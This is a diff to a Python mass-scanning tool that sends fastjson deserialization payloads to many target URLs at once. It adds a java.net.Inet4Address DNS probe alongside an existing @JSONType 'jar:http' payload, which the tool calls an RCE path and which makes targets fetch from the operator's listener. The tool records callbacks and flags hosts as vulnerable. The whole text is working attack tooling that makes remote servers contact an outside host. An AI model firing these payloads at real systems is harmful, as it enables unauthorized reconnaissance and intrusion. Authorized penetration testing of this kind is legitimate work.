@@ -52,6 +52,20 @@ def make_type(host, port, token, entry="POC"):
     return f"jar:http:..{host}:{port}.{token}!.{entry}"
 
 
+def make_dns_obj(collab_raw, token):
+    # OOB probe via a fastjson primitive that ACCEPTS a dotted hostname (unlike the
+    # @JSONType jar: sink). Works with autoType off; confirms fastjson processes @type
+    # AND the host has egress. Fires a Burp Collaborator / interactsh DNS interaction
+    # for "<token>.<collab>". Not RCE — a prerequisite/reachability signal.
+    return '{"@type":"java.net.Inet4Address","val":"%s.%s"}' % (token, collab_raw)
+
+
+def slug(url):
+    h = url.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
+    s = "".join(c for c in h.lower() if c.isalnum())[:16]
+    return s or "t"
+
+
 class CanaryHandler(http.server.BaseHTTPRequestHandler):
     def _record(self):
         token = self.path.lstrip('/').split('!')[0].split('/')[0]
@@ -138,6 +152,10 @@ def main(argv):
     ap.add_argument("--path", default="/parse", help="path for bare-domain targets (default /parse)")
     ap.add_argument("--method", default="POST", help="default HTTP method (default POST)")
     ap.add_argument("--threads", type=int, default=20, help="concurrent request workers (default 20)")
+    ap.add_argument("--probe-type", choices=["jsontype", "dns", "both"], default="jsontype",
+                    help="jsontype = @JSONType jar: RCE-path (int-IP; needs a raw-IP listener); "
+                         "dns = Inet4Address OOB via a DOTTED host (Collaborator-compatible, "
+                         "confirms fastjson+egress); both = send each")
     ap.add_argument("--content-type", default="application/json")
     ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
     ap.add_argument("--timeout", type=float, default=8.0)
@@ -155,15 +173,26 @@ def main(argv):
         srv = None
         print(f"[collaborator] {note}  -> payload host={host}:{port} (watch Burp/interactsh)")
 
+    collab_raw = args.collaborator if args.collaborator else None
+    if args.probe_type in ("dns", "both") and not (collab_raw and not collab_raw.isdigit()):
+        sys.exit("[!] --probe-type dns/both needs --collaborator set to a hostname "
+                 "(e.g. your Burp Collaborator subdomain), not an int/IP.")
+
     targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
     token_map = {}
     jobs = []
     for i, (method, url) in enumerate(targets):
-        token = "fj%04x%s" % (i & 0xffff, os.urandom(3).hex())
-        obj = '{"@type":"%s","x":1}' % make_type(host, port, token)
-        body = args.wrap.replace("{{P}}", obj)
-        token_map[token] = (method, url)
-        jobs.append((token, method, url, body))
+        base = "%s%s" % (slug(url), os.urandom(2).hex())
+        if args.probe_type in ("jsontype", "both"):
+            tok = "j" + base
+            obj = '{"@type":"%s","x":1}' % make_type(host, port, tok)
+            token_map[tok] = (method, url, "jsontype")
+            jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
+        if args.probe_type in ("dns", "both"):
+            tok = "d" + base
+            obj = make_dns_obj(collab_raw, tok)
+            token_map[tok] = (method, url, "dns")
+            jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
 
     workers = max(1, min(args.threads, len(jobs) or 1))
     print(f"[*] firing {len(jobs)} target(s) with {workers} thread(s)\n")
@@ -184,23 +213,28 @@ def main(argv):
         srv.shutdown()
         print("\n===== RESULT =====")
         vuln = 0
-        for token, (method, url) in token_map.items():
+        for token, (method, url, kind) in token_map.items():
             with LOCK:
                 hits = HITS.get(token)
             if hits:
                 vuln += 1
-                print(f"  VULNERABLE  {url}")
+                print(f"  VULNERABLE  [{kind}] {url}")
                 for cip, rl in hits:
                     print(f"              callback from {cip}: {rl}")
             else:
-                print(f"  no-callback {url}")
+                print(f"  no-callback [{kind}] {url}")
         print(f"\nVULNERABLE={vuln}/{len(token_map)}  "
-              f"(callback = fastjson fetched the jar: URL = @JSONType SSRF path reachable)")
+              f"(callback = @JSONType SSRF path reachable)")
         return 2 if vuln else 0
     else:
-        print("\n[*] external mode: correlate these tokens in Burp Collaborator / interactsh:")
-        for token, (method, url) in token_map.items():
-            print(f"    GET /{token}   <=  {method} {url}")
+        print("\n[*] external mode — correlate these in Burp Collaborator / interactsh:")
+        for token, (method, url, kind) in token_map.items():
+            if kind == "dns":
+                print(f"    DNS/HTTP  {token}.{collab_raw}   <=  {method} {url}")
+            else:
+                print(f"    HTTP GET  /{token}  (host {host})   <=  {method} {url}")
+        print("\n(dns hits confirm fastjson + egress; jsontype path via int-IP usually will NOT "
+              "register in a public Collaborator — see README.)")
         return 0
 
 
